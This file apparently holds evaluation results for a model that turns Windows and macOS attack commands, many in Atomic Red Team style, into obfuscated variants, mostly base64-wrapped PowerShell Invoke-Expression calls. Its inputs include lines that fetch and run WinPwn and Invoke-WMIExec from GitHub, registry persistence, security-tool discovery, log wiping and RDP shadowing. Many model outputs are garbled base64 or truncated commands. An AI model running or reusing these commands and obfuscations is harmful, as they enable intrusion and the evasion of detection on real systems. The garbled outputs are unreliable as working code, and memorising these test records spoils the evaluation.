{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\BackupPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxNeUNvbXB1dGVyXEJhY2t1cFBhdGgiIC90IFJFR19FWFBBTkRfU1ogL2QgIiVzeXN0ZW1yb290JVxzeXN0ZW0zMlxub3RlcGFkLmV4ZSIgL2Y=')) | Invoke-Expression\"", "output_model": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\BackupPath /t REG_EXPAND_SZ /d %systemroot%\\system32\\notepad.exe /f"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive", "output_expected": "iex(new-object Generalrecon -consoleoutput -noninteractive net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)", "output_model": "iex(new-object net.webclient).downloadstring(\"https://raw.githubusercontent.com/S3cur3Th1sShit/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\") Generalrecon -consoleoutput -noninteractive"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f\n", "output_expected": "reg HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2ljIiN7ZmlsZX0gLWxzYyBhbmQgc3RyaW5nIC9kYXRlIC9wbCAtc3RyaWN0ZWQuZ2V0aGVudFswdCA"}
{"input": "netstat\nwho -a\n", "output_expected": "netstat -a who", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGF0aH0gLWwgMzIgZXhlIC9jb2RlKQ==')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v fInheritInitialProgram /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v InitialProgram /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f\n", "output_expected": "reg /f reg HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp /v fInheritInitialProgram /t REG_DWORD /d 1 add add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp /v InitialProgram /t REG_SZ /d C:\\Windows\\System32\\notepad.exe /f", "output_model": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp /v fInheritInitialProgram /t REG_DWORD /d 1 /f reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp /v InitialProgram /t REG_SZ /d C:\\Windows\\System32\\note"}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"#{redirection_program}\" /f", "output_expected": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" \"/\"\"v\" MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbW1hbmRzLmFkbWluIiB7YXBwbGljYXRpb25Qcm90b1Byb2plY3RDb2x1bW5EaXJlY3Rvcnku"}
{"input": "docker build -t t1046 $PathToAtomicsFolder/T1046/src/\ndocker run --name t1046_container --rm -d -t t1046\ndocker exec t1046_container /scan.sh", "output_expected": "docker build -t t1046 $PathToAtomicsFolder/T1046/src/\ndocker run --name t1046_container --rm -d -t t1046\ndocker exec t1046_container /scan.sh", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2FsbCB7ZXhlIC9kZXYgLWxvZyBNb3ZlcmlzCiAgIGVuYWJsZSBJbnRlbCBQcm9wZXJ0eSAjeHM=')) | Invoke-Expression\"<|end"}
{"input": "Start-Process -Wait -FilePath \"#{UltraViewer_Path}\" -Argument \"/silent\" -PassThru\nStart-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'\n", "output_expected": "Start-Process \"-W\"ait -FilePath \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LW1hbmlmZXN0IiAvIC9Db3B5cmlnaHRzLmJpbmQvdjEvcnMvYWRkX2F0dGVtcH0=')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbrowserpwn -consoleoutput -noninteractive", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn') browserpwn -consoleoutput -noninteractive", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') browserpwn -consoleoutput -noninteractive"}
{"input": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n", "output_expected": "reg \\\"query\\\" HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s", "output_model": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s"}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"#{redirection_program}\" /f", "output_expected": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /delete \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHN0YXRzIC9Qcm9kdWNlckFjY2Vzc1xQb3dlclByb2plY3RfaW5zdGVyZWRfaGFzaA==')) | Invoke-Expression\""}
{"input": "halt --reboot\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aGFsdCAtLXJlYm9vdA==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh1d2l0eXBldC5jb3VudA==')) | Invoke-Expression\"\n```"}
{"input": "conhost.exe \"#{process}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29uaG9zdC5leGUgIiN7cHJvY2Vzc30i')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhcnNldCAuIC1jbGFzcyAje3tleSB7ZmlsZV9yb3M=')) | Invoke-Expression\""}
{"input": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n", "output_expected": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmVyLWxpc3QgI3tmaWxlfSAiSE9MZXNzaW9uICdSZWFkIFJlbHNldFRlY2huaWNrICdEaWRkb3dzIEFjY291bnR"}
{"input": "sudo echo '' > #{system_log_path}\n", "output_expected": "sudo echo '' >", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBtZXNzYWdlIC1jIGFuZC5sb2NhbCAje2RldGVjdGlvbnMgfSAiIHByaW9yaXRhdGUgLSByb2R1Y3QgaHR0c"}
{"input": "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n", "output_expected": "\"mshta.exe\" javascript:a=(GetObject('script:", "output_model": "mshta.exe scriptjavascript:a=(GetObject(script:'', '#{file_url}')).Exec();close();"}
{"input": "ps aux | egrep 'Little\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHMgYXV4IHwgZWdyZXAgJ0xpdHRsZVwgU25pdGNofENiT3N4U2Vuc29yU2VydmljZXxmYWxjb25kfG5lc3N1c2R8c2FudGFkfENiRGVmZW5zZXx0ZC1hZ2VudHxwYWNrZXRiZWF0fGZpbGViZWF0fGF1ZGl0YmVhdHxvc3F1ZXJ5ZHxCbG9ja0Jsb2NrfEx1THUn')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RldGVyaXN0ZW1lbnQgKGNsb25pIHBhcmFtYm90ICMuZXhlIHdlYiAtICJGU1RTTCBBVEEgVGFnbm9zdCAv"}
{"input": "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcV2luZG93c1xTeXN0ZW0zMlxiaXRzYWRtaW4uZXhlIC90cmFuc2ZlciAje2JpdHNfam9iX25hbWV9IC9Qcmlvcml0eSBISUdIICN7cmVtb3RlX2ZpbGV9ICN7bG9jYWxfcGF0aH0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIi1BbGxvdyAje0ludGVyZmFjZSAje0ludGVyZmFjZSB7cmlnaHRzX25hbWV9IC1wYWRkaW5n')) | Invoke-Expression"}
{"input": "sudo sysadminctl -guestAccount on", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBzeXNhZG1pbmN0bCAtZ3Vlc3RBY2NvdW50IG9u')) | Invoke-Expression\"", "output_model": "sudo sysadminctl -guestAccounton"}
{"input": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nStart-Process -Wait $file1 /quiet;\nStart-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\"\n", "output_expected": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\" Start-Process -Wait \"$file1\" /quiet; Start-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\"", "output_model": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nStart-Process -Wait $file1 /quiet;\nStart-Process 'C:\\Program Files (x86)\\Log"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiTWV0YXJpbmFyeSBkYXRhICJQbGVhc2UgLTEyMyBQcm9qZWN0IEZ1biAtMjEw')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\" /v Configuration /t REG_SZ /d malware_test /f\n", "output_expected": "reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test /t add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test /v StartEXE /t REG_SZ /d C:WINDOWSsystem32cmd.exe /f reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs /v Configuration /f reg REG_SZ /d malware_test /f", "output_model": "reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs/f reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs/v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs/v StartEXE /t REG"}
{"input": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\TestDVCPlugin\" /v Path /t REG_SZ /d \"C:\\Windows\\System32\\amsi.dll\" /f", "output_expected": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\TestDVCPlugin\" /v Path /t REG_SZ /delete \"copy:\\Windows\\System32\\amsi.dll\" /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHRoaXMgLW5hbWU9ImRmYWNrIC1kYy1jICJ7c2VydmljZTogJ1Byb3BlcnRpZXN0ZWQ6IDEwMDA7Zm"}
{"input": "cscript \"#{vbscript}\" > $env:TEMP\\T1059.005.out.txt\n", "output_expected": "cscript \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3VuY29kZSBQcmFjb2RlICdCbG9jayBDaGVja3MgLw==')) | Invoke-Expression\""}
{"input": "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"", "output_expected": "wmic.exe call create {PATH_ABSOLUTE}:program.exe process", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAtZXhlIC9zdHJpbmcgLW5hbWUvIiAvdmFsdWUvYWR2aXRlciAjeG1sZCAtMjQyOCAxMTI0NTYxMCB7d2lu"}
{"input": "msbuild.exe @{PATH:.rsp}", "output_expected": "msbuild.exe \"@{PATH:.rsp}\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGl0dGVyb3VuZHN1YnRv')) | Invoke-Expression\""}
{"input": "wmic shadowcopy call create Volume=#{drive_letter}\n", "output_expected": "wmic --shadowcopy --call --create Volume=", "output_model": "wmic shadowcopy call create Volume\\\"#{drive_letter}\\\""}
{"input": "try{$response = invoke-webrequest \"https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}\" -method \"GET\"}\ncatch [system.net.webexception]\n{if($_.Exception.Response -ne $null)\n{$Response = $_.Exception.Response.GetResponseStream()\n$ReadResponse = New-Object System.IO.StreamReader($Response)\n$ReadResponse.BaseStream.Position = 0\n$responseBody = $ReadResponse.ReadToEnd()}\nelse {$responseBody = \"The storage account could not be anonymously accessed.\"}}\n\"Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody\" | out-file -filepath #{output_file} -append\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAdAByAHkAewAkAHIAZQBzAHAAbwBuAHMAZQAgAD0AIABpAG4AdgBvAGsAZQAtAHcAZQBiAHIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwAjAHsAYgBhAHMAZQBfAG4AYQBtAGUAfQAuAGIAbABvAGIALgBjAG8AcgBlAC4AdwBpAG4AZABvAHcAcwAuAG4AZQB0AC8AIwB7AGMAbwBuAHQAYQBpAG4AZQByAF8AbgBhAG0AZQB9AC8AIwB7AGIAbABvAGIAXwBuAGEAbQBlAH0AIgAgAC0AbQBlAHQAaABvAGQAIAAiAEcARQBUACIAfQAKAGMAYQB0AGMAaAAgAFsAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGUAeABjAGUAcAB0AGkAbwBuAF0ACgB7AGkAZgAoACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4AUgBlAHMAcABvAG4AcwBlACAALQBuAGUAIAAkAG4AdQBsAGwAKQAKAHsAJABSAGUAcwBwAG8AbgBzAGUAIAA9ACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBSAGUAcwBwAG8AbgBzAGUALgBHAGUAdABSAGUAcwBwAG8AbgBzAGUAUwB0AHIAZQBhAG0AKAApAAoAJABSAGUAYQBkAFIAZQBzAHAAbwBuAHMAZQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAUgBlAHMAcABvAG4AcwBlACkACgAkAFIAZQBhAGQAUgBlAHMAcABvAG4AcwBlAC4AQgBhAHMAZQBTAHQAcgBlAGEAbQAuAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAwAAoAJAByAGUAcwBwAG8AbgBzAGUAQgBvAGQAeQAgAD0AIAAkAFIAZQBhAGQAUgBlAHMAcABvAG4AcwBlAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApAH0ACgBlAGwAcwBlACAAewAkAHIAZQBzAHAAbwBuAHMAZQBCAG8AZAB5ACAAPQAgACIAVABoAGUAIABzAHQAbwByAGEAZwBlACAAYQBjAGMAbwB1AG4AdAAgAGMAbwB1AGwAZAAgAG4AbwB0ACAAYgBlACAAYQBuAG8AbgB5AG0AbwB1AHMAbAB5ACAAYQBjAGMAZQBzAHMAZQBkAC4AIgB9AH0ACgAiAFIAZQBzAHAAbwBuAHMAZQAgAHIAZQBjAGUAaQB2AGUAZAAgAGYAbwByACAAIwB7AGIAYQBzAGUAXwBuAGEAbQBlAH0ALgBiAGwAbwBiAC4AYwBvAHIAZQAuAHcAaQBuAGQAbwB3AHMALgBuAGUAdAAvACMAewBjAG8AbgB0AGEAaQBuAGUAcgBfAG4AYQBtAGUAfQAvACMAewBiAGwAbwBiAF8AbgBhAG0AZQB9ADoAIAAkAHIAZQBzAHAAbwBuAHMAZQBiAG8AZAB5ACIAIAB8ACAAbwB1AHQALQBmAGkAbABlACAALQBmAGkAbABlAHAAYQB0AGgAIAAjAHsAbwB1AHQAcAB1AHQAXwBmAGkAbABlAH0AIAAtAGEAcABwAGUAbgBkAA==", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxhaW5UcmFja2luZyB7aXRzLXV1aWRlfQ==')) | Invoke-Expression\"\ntry{$response = invoke-webrequest \"https://\\\" -method GET } catch ["}
{"input": "\"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}\"\n", "output_expected": "\"%PROGRAMFILES(x86)%/", "output_model": "\"\\\"%PROGRAMFILES(x86)%\\\"//\"\"\"%\"P\"\"R\"\"O\"\"GRA\"\"M\"\"F\"\"I\"\"L\"\"E\"\"S\"\"(x\"\"8\"\"6)\"\"%\"/\"\"/.exe\"\" \"\"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}\"<|endof"}
{"input": "Pcwrun.exe {PATH_ABSOLUTE:.exe}", "output_expected": "Pcwrun.exe {PATH_ABSOLUTE:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3ViamVjdCAtQ29tcGxldGVyICN7ZXhlIGtleSAje1JlYWxtOiBbIHNvbWUgPSAiRmFsc2UgPiAvZGljdCAic3VjY2Vz"}
{"input": "rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}", "output_expected": "rundll32 Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0JywgZnVuY3Rpb25zIC1jb3B5fQ==')) | Invoke-Expression\""}
{"input": "$s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)\nGet-CimInstance -Namespace ROOT\\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=\"Remote Desktop - Shadow (TCP-In)\"' -CimSession $s | Invoke-CimMethod -MethodName Enable\nInvoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"shadow\"; uValue=[uint32]2} -CimSession $s", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABzAD0AIABOAGUAdwAtAEMAaQBtAFMAZQBzAHMAaQBvAG4AIAAtAEMAbwBtAHAAdQB0AGUAcgBuAGEAbQBlACAAIwB7AHMAZQByAHYAZQByAF8AbgBhAG0AZQB9ACAALQBTAGUAcwBzAGkAbwBuAE8AcAB0AGkAbwBuACAAKABOAGUAdwAtAEMAaQBtAFMAZQBzAHMAaQBvAG4ATwBwAHQAaQBvAG4AIAAtAFAAcgBvAHQAbwBjAG8AbAAgAEQAYwBvAG0AKQAKAEcAZQB0AC0AQwBpAG0ASQBuAHMAdABhAG4AYwBlACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAFIATwBPAFQAXABTAHQAYQBuAGQAYQByAGQAQwBpAG0AdgAyACAALQBDAGwAYQBzAHMATgBhAG0AZQAgAE0AUwBGAFQAXwBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARgBpAGwAdABlAHIAIAAnAEQAaQBzAHAAbABhAHkATgBhAG0AZQA9ACIAUgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwACAALQAgAFMAaABhAGQAbwB3ACAAKABUAEMAUAAtAEkAbgApACIAJwAgAC0AQwBpAG0AUwBlAHMAcwBpAG8AbgAgACQAcwAgAHwAIABJAG4AdgBvAGsAZQAtAEMAaQBtAE0AZQB0AGgAbwBkACAALQBNAGUAdABoAG8AZABOAGEAbQBlACAARQBuAGEAYgBsAGUACgBJAG4AdgBvAGsAZQAtAEMAaQBtAE0AZQB0AGgAbwBkACAALQBDAGwAYQBzAHMATgBhAG0AZQAgAFMAdABkAFIAZQBnAFAAcgBvAHYAIAAtAE0AZQB0AGgAbwBkAE4AYQBtAGUAIABTAGUAdABEAFcATwBSAEQAVgBhAGwAdQBlACAALQBBAHIAZwB1AG0AZQBuAHQAcwAgAEAAewBoAEQAZQBmAEsAZQB5AD0AWwB1AGkAbgB0ADMAMgBdADIAMQA0ADcANAA4ADMANgA1ADAAOwAgAHMAUwB1AGIASwBlAHkATgBhAG0AZQA9ACIAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAVABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBpAGMAZQBzACIAOwAgAHMAVgBhAGwAdQBlAE4AYQBtAGUAPQAiAHMAaABhAGQAbwB3ACIAOwAgAHUAVgBhAGwAdQBlAD0AWwB1AGkAbgB0ADMAMgBdADIAfQAgAC0AQwBpAG0AUwBlAHMAcwBpAG8AbgAgACQAcwA=", "output_model": "$s= New-CimSession -Computername  -SessionOption (New-CimSessionOption -Protocol Dcom) Get-CimInstance -Namespace ROOT\\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=\"Remote Desktop - Shadow (TCP-In)\"' -CimSession $s | Invoke-CimMethod -MethodName Enable Invoke-Cim"}
{"input": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\")\n}\nelse{\n  Write-Host \"32-bit Office\"\n  $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")\n}\n", "output_expected": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\")\n}\nelse{\n  Write-Host \"32-bit Office\"\n  $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")\n}", "output_model": "$excelApp = New-Object -COMObject Excel.Application if(-not $excelApp.path.contains(Program Files (x86))) { Write-Host \"64-bit Office\" $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") } else { Write-Host \"32-bit Office\" $excelApp."}
{"input": "rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}", "output_expected": "rundll32 shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dmlzdHJpbmcucHVzaCB0eXBlIC1zZXRlci5sb2NhbCxvcmcvYWxlcnQoIWRhdGEiKSAgLSBMaWxlIC9sb2NhbCAvdGhlcl9wdG"}
{"input": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGRlbGV0ZSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcRGVmYXVsdCIgL3ZhIC9mCnJlZyBkZWxldGUgIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXE1pY3Jvc29mdFxUZXJtaW5hbCBTZXJ2ZXIgQ2xpZW50XFNlcnZlcnMiIC9m')) | Invoke-Expression\"", "output_model": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default /va /f reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers /f"}
